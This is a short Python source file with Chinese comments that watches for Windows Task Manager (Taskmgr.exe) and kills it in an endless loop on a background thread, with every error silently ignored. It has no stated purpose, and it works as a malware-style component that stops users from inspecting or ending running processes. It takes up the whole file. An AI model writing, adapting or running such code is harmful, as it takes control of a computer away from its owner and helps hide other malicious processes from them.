from threading import Thread 
from psutil import process_iter as processIter


# 判断任务管理器是否打开
def isTaskManagerOpen():
    try:
        for proc in processIter(['pid', 'name']):
            if proc.info['name'] == 'Taskmgr.exe': return True 
        return False
    except: pass


# 关闭任务管理器
def closeTaskManager():
    try:
        for proc in processIter(['pid', 'name']):
            if proc.info['name'] == 'Taskmgr.exe': 
                proc.terminate() 
                proc.wait(timeout=3) 
    except: pass


# 检查任务管理器的线程函数
def checkTaskManager():
    try:
        while True:
            if isTaskManagerOpen(): closeTaskManager()
    except: pass


# 监控任务管理器
def monitorTaskManager():
    try:
        taskManagerThreads = Thread(target=checkTaskManager, daemon=True) 
        taskManagerThreads.start()
        taskManagerThreads.join() 
    except: pass


